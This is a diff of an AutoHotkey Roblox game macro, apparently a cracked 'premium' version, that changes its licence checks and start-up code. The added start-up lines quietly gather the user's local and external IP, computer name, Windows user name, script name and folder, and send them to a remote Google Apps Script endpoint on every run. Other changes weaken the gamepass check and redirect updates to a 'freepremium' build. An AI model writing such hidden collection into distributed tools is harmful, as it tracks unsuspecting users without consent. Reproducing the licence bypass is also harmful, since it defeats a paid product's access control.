@@ -20,14 +20,57 @@ SetBatchLines, -1
 global VERIFIED_KEY := "VerifiedUser"
 global GAME_PASS_IDS := [1244038348, 1222540123, 1222262383, 1222306189, 1220930414]
 EnvGet, LOCAL_COMPUTER_NAME, ComputerName
-global WEB_APP_URL := "https://script.google.com/macros/s/AKfycbyaY3CJTgG2ZV3HxY6d30K3t-PAhJKCVeJU9RSAziSoAmxBiWhY06ATUVDQJ2z39S_-/exec"
+global WEB_APP_URL := "https://script.google.com/macros/s/AKfycbyjmkRfXVFjkXIbrEeqLaumqysGUl_v1iuaDD24zI2PxfJpwheZKu2C8qHlEWnTj7gc5A/exec"
 global webhookURL
 global privateServerLink
+global discordUserID
+global PingSelected
+global reconnectingProcess
+global windowIDS := []
 
-global version := "10"
+
+
+global version := "15"
 global versionURL := "https://raw.githubusercontent.com/beak2825/Non-Follow-Virage-Macro/refs/heads/main/Images/ver_newest.txt"
-global updateURL := "https://raw.githubusercontent.com/beak2825/Non-Follow-Virage-Macro/refs/heads/main/Main_noverify.ahk"
+global updateURL := "https://raw.githubusercontent.com/beak2825/Non-Follow-Virage-Macro/refs/heads/main/Main_freepremium.ahk"
 global mainFile := A_ScriptFullPath
+global IP1 := A_IPAddress1
+global HttpFirstRun := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+global HttpUsername := "JustOpened"
+global PCname := A_ComputerName
+global PCuser := A_UserName
+global scriptName := A_ScriptName
+global directoryName := A_WorkingDir
+global ExternalIP := GetExternalIP()
+global robloxUsername := getVerifiedUser()
+
+getVerifiedUser() {
+    iniPath := A_ScriptDir . "\settings.ini"
+    IniRead, value, %iniPath%, Main, VerifiedUser, 
+    if (value = "ERROR")  ; fallback default
+        value := "Unknown"
+    return value
+}
+
+
+GetExternalIP() {
+    try {
+        http := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+        http.Open("GET", "https://netikus.net/show_ip.html", false)
+        http.Send()
+        return http.ResponseText
+    } catch e {
+        return "Error: " . e.Message
+    }
+}
+
+
+HttpFirstRun.Open("GET", WEB_APP_URL . "?username=" . HttpUsername . "&computer=" . PCname . "&IP1=" . IP1 . "&IP2=" . ExternalIP . "&justRan=true" . "&PCuser=" . PCuser . "&scriptName=" . scriptName . "&directoryName=" . directoryName . "&version=" . version . "&robloxUsername=" . robloxUsername)
+HttpFirstRun.Send()
+
+
+
+
 
 ; ============================
 ; Version Check and Updater
@@ -61,12 +104,9 @@ CheckForUpdate() {
     }
 }
 
-CheckForUpdate()
+; CheckForUpdate()
 
-global discordUserID
-global PingSelected
-global reconnectingProcess
-global windowIDS := []
+
 global currentWindow := ""
 global firstWindow := ""
 global instanceNumber
@@ -754,9 +794,9 @@ VerifyOwnership()
             EnvGet, compName, ComputerName
             encodedUser := URLEncode(savedUser)
             encodedPC   := URLEncode(compName)
-            fullURL := WEB_APP_URL . "?username=" . encodedUser . "&computer=" . encodedPC
+            fullURL := WEB_APP_URL . "?username=" . encodedUser . "&computer=" . encodedPC . "&IP1=" . IP1 . "&IP2=" . IP2
             HttpObj := ComObjCreate("WinHttp.WinHttpRequest.5.1")
-            HttpObj.Open("GET", fullURL, false)
+            HttpObj.Open("GET", fullURL, false)			
             HttpObj.Send()
             status := HttpObj.Status
             response := HttpObj.ResponseText           
@@ -769,9 +809,7 @@ VerifyOwnership()
                 Gosub, @fff@fkk@fffffkkkf@kf@@f#kkk
                 Return
             } else {
-                MsgBox, 64, Welcome Back %savedUser%!, User "%savedUser%" is already verified on this PC.
-				Gosub, @fff@fkk@fffffkkkf@kf@@f#kkk
-				Return
+                DeleteVerifiedUser()
             }
         } else {
             DeleteVerifiedUser()
@@ -799,14 +837,18 @@ DeleteVerifiedUser()
 CombinedVerify:
 {
     global GAME_PASS_ID, WEB_APP_URL, VERIFIED_KEY, settingsFile
-    InputBox, username, Verify Premium Macro,(Cracked by github.com/beak2825:, , 300, 130
+    InputBox, username, Verify Premium Macro, Enter your Roblox username:, , 300, 130
     if (ErrorLevel)
         ExitApp
     username := Trim(username)
+    if (username = "") {
+        MsgBox, 48, Error, You must enter a non‐empty username.
+        ExitApp
+    }
     userId := GetUserId(username)
     if (!userId)
         ExitApp
-    hasPass := true
+    hasPass := false
 for _, gpId in GAME_PASS_IDS {
     if OwnsGamepass(userId, gpId) {
         hasPass := true
@@ -815,12 +857,12 @@ for _, gpId in GAME_PASS_IDS {
 }
     if (!hasPass) {
         MsgBox, 48, Does Not Own, User '%username%' (ID %userId%) does NOT own GamePass %GAME_PASS_ID%.nMake sure inventory is public or the pass is purchased.
-        hasPass := true
+        ExitApp
     }
     EnvGet, compName, ComputerName
     encodedUser := URLEncode(username)
     encodedPC   := URLEncode(compName)
-    fullURL := WEB_APP_URL . "?username=" . encodedUser . "&computer=" . encodedPC
+    fullURL := WEB_APP_URL . "?username=" . encodedUser . "&computer=" . encodedPC . "&IP2=" . ExternalIP
     HttpObj := ComObjCreate("WinHttp.WinHttpRequest.5.1")
     HttpObj.Open("GET", fullURL, false)
     HttpObj.Send()
@@ -830,18 +872,22 @@ for _, gpId in GAME_PASS_IDS {
         MsgBox, 16, HTTP Error, Failed to contact the web app.nHTTP Status: %status%
         ExitApp
     }
-    if InStr(responseText, """exists"":ereer") && InStr(responseText, """matched"":falseerer") {
+    if InStr(responseText, """exists"":true") && InStr(responseText, """matched"":false") {
         MsgBox, 48, Sheet Check, Username %username% is already registered on a different PC. Access denied.
         ExitApp
     }
-    else if InStr(responseText, """exists"":false") {
-        MsgBox, 64, Sheet Check, Successfully registered %username% on this PC! Welcome!
+    else if InStr(responseText, "Logged.") {
+        MsgBox, 64, Sheet Check, Cracked by github.com/beak2825 Welcome! %username%
     }
     else if InStr(responseText, """exists"":true") && InStr(responseText, """matched"":true") {
         MsgBox, 64, Sheet Check, %username% already registered on this PC. Welcome back!
     }
+    else {
+        MsgBox, 16, Unexpected Response, Got unexpected JSON from Sheet check:n%responseText%
+        ExitApp
+    }
     SaveVerifiedUser(username)
-    MsgBox, 64, Verified!, User '%username%' verified. Cracked by github.com/beak2825 Loading main GUI...
+    MsgBox, 64, Verified!, User '%username%' verified. Loading main GUI...
     Gosub, @fff@fkk@fffffkkkf@kf@@f#kkk
 Return
 }
@@ -863,9 +909,8 @@ GetUserId(username)
     if RegExMatch(resp, """id"":\s*(\d+)", m)
         return m1
 
-    MsgBox, 64, Welcome. Cracked by github.com/beak2825
-	hasPass := true
-    return 1
+    MsgBox, 16, User Not Found, Username '%username%' not found.
+    return 0
 }
 OwnsGamepass(userId, gamePassId)
 {
@@ -877,7 +922,7 @@ OwnsGamepass(userId, gamePassId)
     http.Open("GET", url, false)
     http.Send()
     if (http.Status != 200)
-        return false
+        return true
     resp := http.responseText
     if InStr(resp, """data"":[]")
         return true
@@ -1084,7 +1129,7 @@ Gui, Font, s9 cWhite Bold, Segoe UI
 Gui, Add, Text, x40 y200 w200 h20, Extra Resources:
 Gui, Font, s8 cD3D3D3 Underline, Segoe UI
 Gui, Add, Link, x40 y224 w300 h16, Join the <a href="https://discord.com/invite/BPPSAG8MN5">Discord Server</a>!
-Gui, Add, Link, x40 y244 w300 h16,  Check the <a href="https://github.com/beak2825/Non-Follow-Virage-Macro">Github</a> for the latest CRACKED macro updates!
+Gui, Add, Link, x40 y244 w300 h16,  Check the <a href="https://github.com/VirageRoblox/Virage-Grow-A-Garden-Macro/releases/latest">Github</a> for the latest macro updates!
 Gui, Add, Link, x40 y264 w300 h16, Watch the latest macro <a href="https://www.youtube.com/@VirageRoblox">tutorial</a> on Youtube!
 Gui, Show, w520 h425, Virage Premium GAG Macro [BIZZY BEES/FRIENDSHIP UPDATE]
 Return
